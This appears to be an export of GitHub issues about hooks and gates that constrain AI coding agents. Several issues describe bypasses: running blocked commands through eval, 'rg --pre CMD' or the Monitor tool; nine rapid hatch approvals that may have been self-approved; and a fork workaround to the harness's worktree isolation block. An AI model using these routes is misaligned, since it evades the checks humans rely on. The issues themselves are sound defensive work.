Real evidence from 2026-08-19 in [alex-mextner/sme-archiving-gc](https://github.com/alex-mextner/sme-archiving-gc). First: PR 219 bumped pyproject.toml from 0.1.25 to 0.1.26 to satisfy the version-bump gate. Meanwhile PR 220, a completely unrelated feature, was also merged with its own version bump and landed first. This caused PR 219 to hit a real merge conflict on pyproject.toml and uv.lock, requiring a manual rebase and conflict resolution to fix. Second: later the same day, nine more PRs were independently implemented and made ready (issues 133, 140, 143, 169, 177, 188, 189, 191, 194, 198). Every single one is now blocked by the same version-bump gate, because none of them bumped the version - correctly, since bumping in every PR would just recreate the PR 219 vs PR 220 conflict again on a larger scale.

## User impact
Right now, doing genuinely normal parallel development - several fix PRs in flight at once, which is routine in any active repository - means every single one of them gets stuck on this gate. Unblocking them requires either a merge-conflict-prone free-for-all where each PR bumps the version and fights the others on merge, or serial human intervention: manually picking one PR, bumping its version, merging it, then repeating the whole process for every remaining PR one at a time.

## Cost of inaction
This friction recurs every time a repository using ship has more than one shippable PR in flight at the same time, which is the routine case, not a rare edge case, for any actively developed project.

## Acceptance criteria
- [ ] The gate (or its docs) provides a clear recommended workflow for N parallel PRs sharing one version file - for example, bump the version only when merging the last PR in a batch, or have ship itself detect this specific blocking reason and offer to bump plus rebase automatically right before merging.
- [ ] A real reproduction scenario from this report (the PR 219 vs PR 220 version-bump conflict, or the situation where nine PRs were all blocked at once) is used as a concrete test case for whatever fix is chosen.

When two people (or their AI agents) are working on this codebase at the same time, one person's cleanup command can no longer accidentally kill the OTHER person's still-running work (a code review in progress, a test run in progress) just because both processes share a common name. title: require-ticket-before-commit: heredoc commit -m garbles message, false-blocks tickets with embedded quotes
body:
## What


## Why (motivation)
The hook's tokenizer (_tokenize/_strip_line_comment) is pure shlex-based text scanning with no awareness of $(...) command substitution or heredocs. When a commit message is built via 'git commit -m "$(cat <<EOF ... EOF)"' (the exact multi-line-commit-message pattern this agent harness's own system prompt recommends) and the message body contains any literal double-quote character, shlex treats that embedded quote as closing the -m string early, so commit_message_from_argv extracts a garbled, truncated fragment instead of the real message -- and then correctly, but wrongly, reports 'no ticket reference found' even when the actual message has one.

## User impact
A legitimate, properly-ticketed commit gets silently blocked with a misleading 'no ticket reference' error, even though the real commit message clearly names the ticket. The author has to discover (by manually replaying the hook's own parser offline) that the blocker is a heredoc/quote-parsing bug, not a missing ticket, then work around it by writing the message to a file and using 'git commit -F <file>' instead. This wastes time on every repo that has this hook installed (it is a GLOBAL git hook via core.hooksPath) whenever a commit message legitimately needs an embedded quote.

## Cost of inaction
Every future commit whose message needs a quoted phrase and is built via the standard heredoc idiom keeps silently false-blocking on this hook, with a misleading error message that points nowhere near the real cause.

## Acceptance criteria
- [ ] A commit via 'git commit -m "$(cat <<EOF ... EOF)"' whose message body contains a literal double-quote character (e.g. a quoted phrase) is no longer misread as message text ending at that first embedded quote; has_ticket_reference sees the real, full message.
- [ ] A regression test reproducing this exact case (heredoc-built -m value containing an embedded double-quoted phrase, with a real ticket reference like 'Fixes #123' later in the message) passes: the hook allows the commit instead of blocking it.

## Screenshots
(none)

## Links
- (none)

## Skipped gates
- links: found live during unrelated review-cli work; no external doc/thread to link, reproduction steps are in the acceptance criteria

This is the exact same bug as #503 (both are about the commit-gate hook mishandling a multi-line commit message authored via the documented `git commit -m "$(cat <<'EOF' ... EOF)"` heredoc pattern) — duplicate report filed independently.

Fixed in #503's PR: https://github.com/alex-mextner/agent-tools/pull/599

That PR specifically reproduces and fixes this issue's exact scenario — an embedded quote inside the heredoc body corrupting the tokenizer's quote tracking and truncating the extracted message before it reaches a real ticket reference — with a regression test (`test_heredoc_m_paired_embedded_quote_before_ticket_allows`) that reproduces the false BLOCK live before the fix and confirms it allows after.

Closing as a duplicate of #503. Tracking continues there / on the PR.

title: ship: known-flake gate follow-ups (N+1 gh calls, required-check dead-end, StatusContext doc, lookback test)
body:
Follow-ups deliberately deferred from the --known-flake gate (PR #407), per review findings not
addressed in that PR to keep it converged. All four:

1. **N+1 gh-API calls when multiple checks fail simultaneously** (GLM review, PR #407). Each
   failing check independently re-fetches gh pr view/run list/run view, even when checks share a
   workflow/run. Fix: a single GraphQL query nesting run-list + jobs, or memoize per
   workflow/run-id (bash 3.2 compatibility — no associative arrays — makes this a real scope, not
   a one-liner).

2. **Required-check dead-end UX** (k3 review, PR #407). When the confirmed flaky check is also a
   REQUIRED status check under branch protection, GitHub still refuses the final merge (a FAILING
   required check blocks, unlike the empty-rollup case where nothing failed). The gate does
   everything right and still can't land — currently just documented as a caveat, not detected or
   handled. Consider: detect via the branch-protection API (when accessible) and warn up front,
   or fall through to the --skip-ci hatch automatically with a clear message.

3. **StatusContext checks can never be confirmed** (Opus review, PR #407). `_known_flake_confirmed`
   looks for a matching failed Actions JOB via `gh run view --json jobs`; a StatusContext
   (external status, no workflowName) never appears there, so `--known-flake` silently can't help
   for that class of check. Fail-closed (safe), but undocumented and untested.

4. **Lookback-window semantics untested** (Opus review, PR #407). SHIP_FLAKE_LOOKBACK_RUNS and
   the "any match in the window is sufficient, not just the latest run" behavior have no test
   coverage — both fixtures in tests/test_ship.py return exactly one base-branch run.

See PR #407 review threads for full review-cli commentary (k3/GLM/Opus rounds).

comments.body:
Additional findings from later review-cli rounds (k3/GLM/Opus), not yet covered above:

5. **PR-trigger-only workflows can never be confirmed, and refusal doesn't say why** (k3).
   `gh run list --branch <base>` only returns runs associated with push/merge_group events on
   that branch — a `pull_request:`-only workflow has zero runs there, so `--known-flake` is
   permanently dead for it, and the refusal message ("could NOT be confirmed") is
   indistinguishable from "the claim is false". Distinguish "no base runs found in the window"
   from "runs found, job never failed" in the message, and document the limitation.

6. **Audit `checks` field is space-joined, not a JSON array** (Opus). A check name containing a
   space (e.g. a matrix job `pytest (3.11)`) makes multiple asserted names unrecoverable from
   the audit record. Emit a JSON array instead.

7. **A known-flake confirmed, but blocked by a gate BELOW it (review-dwell, version-bump,
   review-quorum), leaves zero audit trace** (Opus). Not a safety bug — nothing merges — but it
   breaks the "one line per gated ship" / after-the-fact-reviewability promise the rest of this
   file relies on. Consider a distinct terminal decision on those exit paths.

title: ship: add --known-flake gate for confirmed pre-existing CI flakes
body:
## Motivation

gh ship's existing CI-down local fallback (ci_appears_structurally_down) only fires when ~80%
of ALL checks fail — a whole-infrastructure outage. The far more common shape is "one specific
check is a flaky, already-broken-on-base-branch test and everything else is green" — that never
looks like an outage, so the fallback never triggers, and the only way through was a human
escalation for something a quick check of the base branch's own recent CI history already
answers.

Concrete case: hyperide PR #742 (HYP-706) was blocked solely by a single flaky test also
independently confirmed to fail on that repo's own main HEAD across several CI runs.

## Acceptance criteria

- [x] `--known-flake <check-name>` flag, repeatable, evidence-gated (not a blind bypass) —
      verifies each assertion against the base branch's own recent CI history before doing
      anything with it.
- [x] Every currently-failing check must be BOTH asserted AND confirmed, or the gate refuses.
- [x] On success, still runs a real local test pass before merging.
- [x] Survives review-cli quorum (3+ passed iterations across 3+ distinct models).

See PR #407.

title: ship.sh review-quorum gate: use role-based coverage as primary check, matching review-cli's own default
body:

title: visual-proof-gate hatch: tighten repeated near-identical Telegram approvals in one session
body:
## What
On 2026-08-21, a subagent working on hyper-saas [PR #747](https://github.com/hyperide/hyper-saas/pull/747) ([HYP-1321](https://linear.app/glide-vc/issue/HYP-1321/chorelint-eliminate-oxlint-knip-debt-blocking-gh-ship-local-checks) lint-debt cleanup) committed 9 times through the visual-proof-gate hook using RIG_HATCH_REQUEST_VISUAL_PROOF_GATE, all 9 recorded in ~/.config/agent-tools/overrides.log as decision=approved / detail='approved by tg-ctl ask', all within a 56-minute window (15:43:51Z-16:39:16Z), most with near-identical boilerplate justification text describing an import-path or type-only refactor with no rendering change. The agent itself flagged this to Alex as a possible self-approval pattern. Code review of agenttools_hatch_escalation.request_hatch_approval() confirms the mechanism genuinely calls tg-ctl's ask subcommand as a subprocess and only sets approved=True after that subprocess exits 0 -- there is no code path that self-approves without invoking tg-ctl. However: cross-checking the tg-ctl daemon log for that exact time window found NO forwarded-question / answered-question log pairs for these 9 requests, unlike a separate, confirmed real permission forward/answer exchange logged elsewhere in the SAME log on the SAME day (15:17:55Z-15:19:22Z, a different subagent/window). This mismatch was not resolved within the timebox of this investigation -- it is either (a) Alex genuinely rapid-tapping approval on 9 near-identical prompts while mid-conversation on an unrelated topic (a process-hygiene problem: an agent should not fire 9 near-identical hatch requests in under an hour without batching/consolidating), or (b) tg-ctl's ask command has a fail-open path that returns exit 0 without a genuine per-question round-trip for this call shape (a P1 infra hole affecting every repo that uses this hatch). Alex's own Telegram reply picked option B on this question: treat it as a violation and tighten the rule -- explicitly NOT accepting it as a non-issue. Per that option's own stated tradeoff, the 9 already-made commits are NOT to be redone or rewritten; this ticket is about closing the process gap going forward only.

## Why (motivation)
Alex explicitly chose to treat this rapid-approvals pattern as a violation needing a process fix, not as an accepted one-off, after the subagent flagged it as a possible self-approval to him in a decision request.

## User impact
Without this, agents can keep firing near-identical hatch-escalation requests in tight succession, either exploiting a real fail-open bug (if one exists) or just wearing down the human's attention until approvals become rubber-stamps -- eroding the one control that is supposed to require a genuine human look before a UI commit with no screenshot lands.

## Cost of inaction
The visual-proof gate keeps being satisfiable by rapid-fire near-identical requests instead of one real screenshot-verified decision, and the open question of whether tg-ctl's ask command can fail open stays unresolved and unmonitored.

## Acceptance criteria
- [ ] Determine definitively whether tg-ctl's ask command completed a genuine per-question Telegram round-trip for each of the 9 approvals on 2026-08-21 (check tg-ctl's own source/tests for how ask matches a reply to a specific pending question, and whether there is any timeout-based or count-based fallback that can return exit 0 without a real reply).
- [ ] If a fail-open path is found in tg-ctl's ask command: close it so every hatch approval requires an unambiguous, reply-matched human decision, with a regression test.
- [ ] If no fail-open path is found (Alex was rapid-tapping real approvals): add a hygiene guard so an agent cannot fire more than N near-identical hatch requests for the same hook in one session or short window without collapsing them into a single batched request with one combined justification.
- [ ] Document the resolution in this ticket, linked from hyperide's agent guide rule about the visual-proof hatch not being a routine per-commit bypass.

title: block-rg-pre: argv-precise hook to block ripgrep --pre (arbitrary command execution)
body:
## What


## Why (motivation)
rg --pre CMD runs CMD as an arbitrary preprocessor on every matched file, turning the read-only search tool every agent is pre-allowed to run into an unrestricted command-execution vector. The 2026-07-01 agent-ecosystem retrospective flagged this gap, and rig-cli's own permissions module comment names an argv-precise claude-code hook as the still-missing deep layer, since the glob-only deny rules cannot honor -- end-of-options or distinguish --pre as a flag from --pre as another flag's value.

## User impact
Without this, an agent can escalate from a read-only search command to arbitrary local code execution by disguising it as an rg invocation, bypassing the intent of the read-only rg allowlist grant. The existing glob belt also over-blocks some legitimate literal searches for the text --pre with no way to fix it centrally.

## Cost of inaction
The arbitrary-command-execution vector through rg --pre stays open on every machine that only has the coarse glob deny rule (or none at all, e.g. a harness without a glob belt), and legitimate literal-text searches for --pre keep false-triggering the existing glob rule.

## Acceptance criteria
- [ ] A new pre-bash agent-hook (agent_hooks/block-rg-pre) blocks any rg/ripgrep invocation carrying a real --pre or --pre=CMD flag (through sudo/env/timeout wrappers, in a pipeline/chain, multi-line), argv-parsed not substring-matched, deny-by-default via a Telegram hatch escalation (RIG_HATCH_REQUEST_BLOCK_RG_PRE) recorded in overrides.log
- [ ] It correctly ALLOWS the literal-text cases the existing glob-only deny rules cannot express: rg -- --pre . (positional after end-of-options), rg -e --pre . (--pre as the VALUE of -e/--regexp, not a flag), and a bare rg --pre-glob '*.gz' . (a different, non-dangerous flag)
- [ ] Registered in agent_hooks README's pre-bash table and in both cross-hook regression suites (hatch import hardening test, hatch escalation descriptor-timeout test)
- [ ] Unit tests cover every block/allow case above plus the hatch approve/deny mechanism, and the full repo test suite passes

title: block-rg-pre: add eval to the shared wrapper table (both block-no-verify and block-rg-pre)
body:
## What


## Why (motivation)
Both agent_hooks' own docstrings claim eval is deliberately excluded from _WRAPPERS to preserve a cross-hook SYNC invariant ('adding it to only one side would break the sync invariant the two hooks rely on') rather than because it can't be done — but nothing currently verifies the two tables actually match, and eval rg --pre CMD . / eval git commit --no-verify both currently bypass their respective hooks silently.

## User impact
An agent (or an adversarial prompt injection) that routes a blocked command through eval currently defeats both block-no-verify and block-rg-pre with zero friction, on any harness whose coarse glob/prefix deny rules don't independently catch the raw text.

## Cost of inaction
The eval bypass stays open indefinitely on every harness lacking a fallback glob rule, and the two hooks' wrapper tables can silently drift out of sync on any future edit to just one of them, since nothing catches that today.

## Acceptance criteria
- [ ] eval is added to the shared _WRAPPERS table in BOTH agent-hooks/block-no-verify/block_no_verify.py and agent-hooks/block-rg-pre/block_rg_pre.py in the same change, so eval rg --pre CMD . and eval git commit --no-verify are both caught, keeping the SYNC'd table invariant the two hooks already document
- [ ] find ... -exec rg --pre ... {} ';' is documented and, if feasible without excessive scope, also inspected (find's -exec command tail resolved the same way xargs's wrapped command already is in block-rg-pre); if not feasible, it stays an explicitly documented known limitation with a regression test pinning current (allowed) behavior

title: skills-read-gate: wire the marker-writer so the gate is actually satisfiable
body:
## What


## Why (motivation)
[docs/specs/2026-07-01-agent-ecosystem-retrospective.md](https://github.com/hyperide/hyper-saas/blob/main/docs/specs/2026-07-01-agent-ecosystem-retrospective.md) ([HYP-858](https://linear.app/glide-vc/issue/HYP-858)) catalogs finding G-3: skills-read-gate waits for a marker directory that nothing ever creates, so it is permanently unsatisfiable and sits in WARN-forever mode. The hook's own README already specifies the exact wrapper contract needed (touch one file per invoked skill) but no code implements it -- verified 2026-08-24 via repo-wide grep: zero writers of skills-invoked/ exist anywhere in agent-tools.

## User impact
The gate meant to enforce reading the delegate-work-to-subagents skill and the visual-proof-cycle skill before real work can never leave WARN tier, because the freshness check always sees a missing marker. Per the retrospective's finding B, an unsatisfiable gate 'actively teaches agents (and humans) to ignore gate output' -- exactly the bypass-economy dynamic the spec exists to kill. Wiring the marker writer makes the gate real: it will actually BLOCK on a genuine repeat-miss instead of warning forever, and genuinely relax once the skill was read.

## Cost of inaction
The gate stays permanently in the WARN tier it was only ever meant to occupy while 'the marker-writer is being wired' (its own code comment says so) -- it never graduates to real enforcement, and its presence keeps training agents that hook warnings are noise.

title: skills-invoked marker: encode scoped skill names so a prefix can't collide with a nested one

## Why (motivation)
Found by the chatgpt-codex-connector automated review on [PR #426](https://github.com/alex-mextner/agent-tools/pull/426) (agent-tools#425, the skills-marker-writer hook), which is the first code to ever write real data into the skills-invoked marker tree and so is the first thing to make this path-nesting encoding load-bearing.

title: skills-marker-writer: garbage-collect abandoned per-session marker directories
body:
## What


## Why (motivation)
Session-scoped markers (agent-tools#425, agent-tools#426) mint one subdirectory per Claude Code session under ~/.cache/agent-tools/skills-invoked/ and nothing ever removes them, so the directory grows by one entry per session forever. An in-hook prune was prototyped directly in agent-tools#426 and reverted after five review rounds surfaced a cascading set of edge cases faster than they could be closed cleanly within that PR's scope.

## User impact
Without cleanup the marker cache directory grows unboundedly over the lifetime of a machine (roughly one directory per Claude Code session, indefinitely) — a real but slow-burn disk-usage and directory-entry-count concern, not a correctness problem with the skills-read-gate check itself.

## Cost of inaction
The cache directory keeps growing forever with no cleanup mechanism at all; low urgency (this is advisory bookkeeping, not something that blocks or corrupts any user-facing feature), but it will eventually need cleaning up by hand or via an ad hoc script if nobody builds the real mechanism.

## Acceptance criteria
- [ ] [skills_marker_writer.py](https://github.com/alex-mextner/agent-tools/blob/main/agent-hooks/skills-marker-writer/skills_marker_writer.py) reclaims session-scoped marker directories that have had no activity for a long, configurable retention window, without ever risking the deletion of a marker any live session still needs, and without ever making a single Skill-tool invocation noticeably slower.
- [ ] The chosen design is evaluated against an external periodic sweep (cron/launchd, running outside this hook's own 800ms-per-invocation timeout budget) as the leading alternative to in-hook garbage collection before committing to more in-hook GC code, given the accumulated findings below.
- [ ] A regression test suite proves: a retention value at or below skills-read-gate's own SKILLS_FRESH_WINDOW_S (7200s default) cannot delete another live session's still-fresh marker; a single oversized/pathological session directory cannot permanently block garbage collection of all its siblings (head-of-line blocking); and any time-boxing added does not exceed the hook's own timeout_ms budget even under a slow/networked filesystem.
- [ ] The design also covers ~/.cache/agent-tools/skills-read-tier (the WARN-then-BLOCK escalation tier marker, one file per session+cwd combination that ever WARNed — see _tier_marker in skills_read_gate.py), not only the skills-invoked marker directory: both grow unboundedly per session and any sweep mechanism built for one should cover both rather than shipping a fix that only handles half the growth.

title: require-ticket-before-commit hook fails to parse a heredoc-based commit message, silently blocking a commit that DOES have a ticket reference
body:
## What


## Why (motivation)
While landing tg-cli PR 286 (2026-08-25), a commit whose message body contained a real ticket reference (Closes #182) inside a heredoc-wrapped -m value was BLOCKED by this hook with 'no ticket reference', even though the literal text was genuinely present in the command string sent to Bash. Root cause (not yet confirmed by reading the tokenizer internals, but strongly suggested by behavior): the hooks shlex-based tokenizer likely treats the heredoc redirect operator as a shell redirect and strips it plus everything after it (see the redirect-stripping helper), silently discarding the heredoc body -- including any ticket reference inside it -- before the ticket-detection regex ever runs. Workaround used: switched to git commit -F FILE, which the hook parses correctly.

## User impact
Someone writing a normal, well-formed commit that already references its ticket gets told the ticket is missing and has to stop and re-diagnose a false error, purely because they wrote the commit message using a common shell heredoc pattern instead of a temp file

## Cost of inaction
Every future person or agent who reaches for the heredoc idiom for a long commit message hits this same false block and has to rediscover the workaround (writing the message to a file first) from scratch

## Acceptance criteria

title: RTK grep→ugrep rewrite has no timeout or root-path guard; orphaned child processes from agent sessions can run unbounded (28-day, ~500% CPU incident)
body:
## What
On 2026-08-25, while responding to a machine-hang emergency, an orphaned 'ugrep' process (PID 68408, parent PID 1, i.e. launchd -- meaning its real parent session was long gone) was found running continuously for 27 days 23 hours (since approximately 2026-07-28) at a sustained ~500% CPU. Its exact command line was: ugrep -G --ignore-files --hidden -I --exclude-dir=.git --exclude-dir=.svn --exclude-dir=.hg --exclude-dir=.bzr --exclude-dir=.jj --exclude-dir=.sl -rl 'No recent AI code review' / --include=*.sh --include=* -I -- a recursive search from the filesystem root (/) for the literal error-message text in [agent-hooks/require-review-before-commit/require_review.py line 729](https://github.com/alex-mextner/agent-tools/blob/main/agent-hooks/require-review-before-commit/require_review.py#L729). RTK (Rust Token Killer, the transparent shell-command rewriter documented in the user's global Claude Code config, distributed as the official homebrew-core formula, upstream source at https://github.com/rtk-ai/rtk) rewrites plain commands like 'git status' to 'rtk git status' transparently via a Claude Code hook, and per its own docs this applies to arbitrary commands -- a past agent session's plain grep invocation was very likely silently rewritten into this unbounded ugrep invocation. Two systemic gaps, independent of the specific upstream tool: (1) the rewrite that produced this command applied no timeout and no sanity check against an unbounded, root-of-filesystem recursive search -- a recursive --hidden search from / with no depth or time limit can run essentially forever on a large disk; (2) the agent or session that launched this background process exited or crashed without the child being reaped, leaving it orphaned under launchd (PID 1) and running for 28 days with nothing checking on it. This is a general process-lifecycle gap for any long-running background command an agent session spawns, not specific to search tools.

## Why (motivation)
RTK is installed as the default shell-command rewriter for Claude Code agent sessions on this machine (transparent hook: 'git status' becomes 'rtk git status', applied to arbitrary commands). Any agent session running a recursive grep or search can be silently rewritten into an unbounded ugrep invocation with no timeout and no root-path sanity check. Separately, when an agent session that launched a background process exits uncleanly (crash, timeout kill, disconnect), nothing currently reaps orphaned children -- they get adopted by launchd (PID 1) and can run indefinitely.

## User impact
Alex, the CTO who does all development work on this machine, had his machine's performance degraded for a full month (builds slower, tests slower, the IDE and everything else fighting for CPU) without knowing why, because a single runaway background process was silently eating half a CPU core's worth of capacity the entire time. He only found it by accident while chasing an unrelated 'machine is hanging' problem. Until this is fixed, the same thing can happen again at any time, and he would have no way to know except by noticing his machine feels slow and manually hunting for the cause.

## Cost of inaction
The same failure mode -- a rewritten or backgrounded command escaping its session with no timeout and no orphan-reaping -- can recur silently at any time and accumulate, since nothing currently detects even one such process. Each occurrence degrades machine performance for the CTO for as long as it goes undetected; the one just found ran undetected for a full month.

## Acceptance criteria
- [ ] A rewritten or spawned recursive filesystem search, or any long-running background command an agent session launches, is bounded by a default timeout, so it cannot run unbounded for days.
- [ ] A sanity check exists that refuses or loudly warns when a recursive search's resolved root is / or another suspiciously broad path such as a home directory, before executing it.
- [ ] A periodic sweep, such as a launchd or cron job, identifies and kills orphaned dev-tool or background processes (parent PID 1, meaning adopted by launchd/init) that have been running above an age and CPU threshold (for example, hours at high sustained CPU) with no owning agent session left alive.
- [ ] The fix is verified against this incident's exact repro shape: a recursive grep-like search launched with no explicit timeout or scope by a session that terminates before the child completes.

(none)

title: Subagent guidance: unique filenames for one-shot scratch artifacts (PR bodies etc.), verify after gh pr create/edit --body-file
body:
## What


## Why (motivation)
An agent working in hyperide (fixing a crash bug, [PR #754](https://github.com/hyperide/hyper-saas/pull/754)) reported that its first gh pr create --body-file picked up a STALE file left in the shared scratchpad directory by an unrelated PRIOR agent run, publishing the wrong PR body. It only caught this because it happened to read the PR back immediately and fixed it via gh pr edit before reporting done. The orchestrator session in that repo routinely runs 5-10+ concurrent subagents, many of which create PRs; if two overlapping subagents both write to a generically-named file (pr-body.md, pr_description.md, etc.) in the same shared per-session scratchpad directory, a later-finishing agent can silently publish an earlier/unrelated agent's leftover body, or two concurrent writers can race. No existing ticket covers this specific pattern. hyperide's own .claude/commands/pr.md already sidesteps the bug class for its own flow by using an inline heredoc rather than a scratch file at all, but that convention is local to one repo's one skill and is not stated anywhere as a general rule for ad hoc subagent PR creation outside that flow. hyperide's [HYP-894](https://linear.app/glide-vc/issue/HYP-894/shared-scratch-clones-can-be-silently-clobbered-by-concurrentretried) covers a related but distinct class (concurrent/retried sessions clobbering a shared GIT CLONE mid-edit) -- same root-cause family (an unscoped shared scratch path touched by concurrent agents) but not this specific one-shot-artifact-filename pattern.

## User impact
Without this, a PR can silently ship with the wrong description/body -- wrong ticket linkage, wrong summary, wrong test plan -- visible only if the creating agent happens to double-check, which is not structurally guaranteed today. This is exactly the kind of silent, hard-to-notice defect that erodes trust in autonomous PR creation, and it applies to every repo that dispatches concurrent subagents, not just hyperide.

## Cost of inaction
This exact failure mode will recur unpredictably any time two subagent runs overlap and both touch a generically-named scratch file, with no structural signal when it happens -- each occurrence is caught only by individual agent diligence, not by design.

## Acceptance criteria
- [ ] delegate-work-to-subagents skill (or a sibling doc it references) explicitly instructs: any one-shot artifact a subagent writes to a shared/session-scoped scratch directory (a PR body, commit-message draft, review notes, etc.) must use a filename unique to that invocation -- e.g. incorporating the ticket/task code, the process PID, or a random suffix -- never a fixed generic name like pr-body.md or pr_description.md
- [ ] the same doc instructs that any gh pr create --body-file / gh pr edit --body-file (or any other one-shot-file-consuming command) must read back the created/edited resource afterward (e.g. gh pr view <n> --json body) and confirm it matches the intended content before reporting done, since a unique filename alone does not catch a wrong-path mistake
- [ ] the change is documentation-only (a skill/doc update), reviewed and merged

title: Monitor tool's shell command bypasses all pre-bash agent-hook guards
body:
## Context

Follow-up finding from the review of the `pre-monitor` point / `subagent-no-monitor` hook
(HYP-1350, agent-tools PR adding `Monitor -> pre-monitor` mapping + rig-cli PR registering
the matcher). Raised by an independent review model (Fable) during that PR's `review diff`
pass — filing per this repo's "never silently drop a review finding" convention rather than
folding it into that PR, since fixing it is materially larger scope than the wedge fix those
PRs address.

## The gap

Claude Code's `Monitor` tool takes a `command` field — a shell command/script, same shape as
Bash's `command`. `Monitor` now dispatches to its own `pre-monitor` point (separate from
Bash's `pre-bash` point). That means every existing `pre-bash` SECURITY guard —
`block-raw-pr-merge`, `block-reset-hard`, `block-no-verify`, `pkill-guard`, `no-shell-file-edit`,
`enforce-timeout-on-bash`, `require-review-before-commit`, `require-ticket-before-commit`,
`orchestrator-stays-thin`, `decision-request-format`, `visual-proof-gate`, `skills-read-gate` —
does NOT see a command run via the Monitor tool's own `command` field. An agent (accidentally,
or deliberately working around a block) can run a raw PR merge or a hard reset through Monitor
instead of Bash and every one of those guards is silently bypassed — `point_for_event`
("PreToolUse", "Monitor") maps to `pre-monitor`, not `pre-bash`, so a `pre-bash`-only
descriptor never even sees the event.

## Suggested fix shapes (not decided — needs a design pass)

1. Fan Monitor calls out to BOTH `pre-bash` and `pre-monitor` (run both sets of descriptors,
   first-block-wins across the union) — `lib/cc_hook_bridge/dispatch.py`'s `to_v1_event`
   already normalizes `args.command` generically, so the `pre-bash` guards' command-string
   parsing would "just work" against `args.command` from a Monitor event too.
2. Or: keep `pre-monitor` as Monitor's only point, but have `subagent-no-monitor` block ALL
   subagent Monitor calls unconditionally (already true today) and separately audit whether
   any `pre-bash` guard is a genuine SECURITY boundary (not just anti-wedge discipline) that
   MUST also cover Monitor for the orchestrator too — those specific guards could get a
   `pre-monitor` descriptor of their own rather than a blanket dual-dispatch.

## Why not fixed in the originating PRs

Scope: those PRs fix a specific, evidenced wedge (a subagent calling Monitor and never
getting the completion notification). This finding is a different, broader problem (guard
coverage for the orchestrator's OWN Monitor usage) that touches the dispatch fan-out design
and every existing pre-bash security hook's threat model — it deserves its own design pass,
not a rider on the wedge fix.

## Acceptance criteria

- [ ] Decide the fan-out shape (dual-dispatch vs. selective pre-monitor descriptors for the
      security-relevant guards) and document the decision in `lib/cc_hook_bridge/README.md`.
- [ ] Implement it, with a clean-room end-to-end test proving a security-sensitive command
      run through Monitor is blocked the same way the equivalent Bash call already is.
- [ ] Audit which `pre-bash` hooks are genuine security boundaries vs. anti-wedge/workflow
      discipline (only the former strictly need Monitor coverage).

title: Document isolation-mode cross-worktree git-op block + fork workaround
body:
## What
Claude Code's Agent tool isolation modes (isolation: worktree / isolation: remote) pin a dispatched subagent's git operations to its own assigned worktree. Any git invocation that targets a DIFFERENT worktree or checkout of the same repository — via cd, git -C, git --git-dir/--work-tree, or the GIT_DIR/GIT_WORK_TREE env vars — is refused by the harness with an explicit isolation error. This is a Claude Code platform-level enforcement point, not something implemented in this repo's agent-hooks (confirmed: no match anywhere in agent-tools or a consuming repo's .claude/settings.json for the error text). The only confirmed working mitigation is dispatching with subagent_type: fork (no isolation param) instead of isolation: worktree/remote — a fork inherits the parent orchestrator's own unconstrained shell rather than getting a fresh isolation pin, so it can touch a different worktree/checkout of the same repo. Nothing in agent-tools currently documents this gap or the fork mitigation anywhere an agent choosing a dispatch mode would see it before hitting the block.

## Why (motivation)
Confirmed via two prior investigations plus this task's own live reproduction: an agent dispatched with isolation: worktree/remote cannot run any git operation (cd, git -C, git --git-dir/--work-tree, or GIT_DIR/GIT_WORK_TREE env) against a different worktree or the shared main checkout of the SAME repository — the harness blocks it outright. The only known-working mitigation (subagent_type: fork) is currently tribal knowledge that exists only in one chat session's history, not documented anywhere agents can discover it.

## User impact
Every agent that hits this block without knowing the fork workaround wastes time flailing with cd/-C/--git-dir variants (all blocked) before either giving up or discovering the fix by accident. Documenting it turns a multi-attempt dead end into a one-line fix.

## Cost of inaction
The workaround stays tribal knowledge scoped to whichever chat session discovered it. Every future agent that needs to touch a path outside its own isolated worktree re-derives the same failed cd/-C/--git-dir attempts before finding (or failing to find) the fork mitigation on its own.

## Acceptance criteria
- [ ] The dispatch-decision skill documents the isolation-mode git block, its exact trigger conditions (cd/-C/--git-dir/env-var redirection of a git command to a path outside the agent's own worktree that belongs to the SAME repo), the exact symptom/error text an agent will see, and the fork workaround (subagent_type: fork, no isolation param) as the fix
- [ ] The documented guidance is concrete enough that an agent hitting the isolation error can pattern-match the symptom to the fix without re-deriving it from scratch

## Screenshots
(none)

- links: internal env-var name and repo-relative file path are not addressable URLs; not external entities requiring a link

title: gh-ship CI-down probe misses billing-block when annotation text isn't checked directly
body:
## What


## Why (motivation)
On [hyperide/hyper-saas#758](https://github.com/hyperide/hyper-saas/pull/758), ci_appears_structurally_down() (ci/ship/ship.sh:670-689) returned false even though the checks' literal check-run annotation read 'recent account payments have failed or your spending limit needs to be increased' — the documented billing-block signature. The probe only fires on two indirect proxies: _ci_github_status_indicator() (ship.sh:634-649, the PUBLIC GitHub status page, which reflects platform-wide incidents, not a single account's billing state — it will almost always read 'operational' for an account-level billing block) and _ci_runs_timing_suspicious() (ship.sh:655-666, all runs completing in under 30s). Neither proxy reliably catches an account-specific billing block whose own check-run annotation already states the cause verbatim; the probe never reads that annotation directly.

## User impact
An otherwise fully-verified, ready-to-merge PR gets blocked because the automatic local-checks fallback never triggers; the only recourse is a human-gated --skip-ci approval for a case the automation is supposed to handle transparently.

## Cost of inaction
Every future billing-block episode where the checks complete slower than 30s or GitHub's public status page (correctly) shows no platform incident will keep silently missing the auto-fallback, forcing a manual --skip-ci detour each time instead of the designed automatic path.

- [ ] ci_appears_structurally_down() (ci/ship/ship.sh:670) additionally checks the check-run annotation text on the PR's failed checks for the known billing-block phrase ('recent account payments have failed' / 'spending limit needs to be increased') and treats a match as a positive detection on its own, independent of the status-page and timing signals
